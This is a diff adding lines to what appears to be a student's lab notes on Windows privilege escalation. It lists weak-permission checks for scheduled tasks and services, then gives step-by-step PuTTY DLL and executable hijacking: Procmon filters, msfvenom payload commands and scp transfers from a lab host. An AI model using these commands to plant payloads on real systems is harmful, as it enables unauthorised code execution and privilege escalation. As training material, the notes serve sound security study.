@@ -540,12 +540,35 @@ s.close()
 * Prompt for Privilege Escalation 
 * reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -> Run to view UAC settings 
 ```
-## 
+## Seheduled Tasks/Services 
 ```
+* Write Permissions 
+* Non-Standard Locations 
+* Unquoted Ecutable Paths 
+* Permission to Run AS System 
+
+```
+## Exploting through Putty through .dlls and .exe
+```
+* Launch Procmon.exe
+* Edit Filters 
+  - Path contains .dll
+  - Result is NAME NOT FOUND
+  - Proc. Name contains putty.exe
+* In TErminator run -> msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\Users\student\Desktop\whoami.txt'-f dll > SSPICLI 
+* From powershell run -> scp student@10.50.37.248:/home/student/SSPICLI.dll "C:\Program Files (X86)\Putty\SSPICLI.dll"
+* CD to C:\ and CD into file location 
+
+* rename og putty file 
+* msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\users\student\Desktop\whoami.txt' -f exe  > putty.exe
+*  scp student@10.50.37.248:/home/student/putty.exe "C:\Program Files (X86)\Putty\putty.exe"
+
+
+
+
 
 
 ```
-
 
 
 
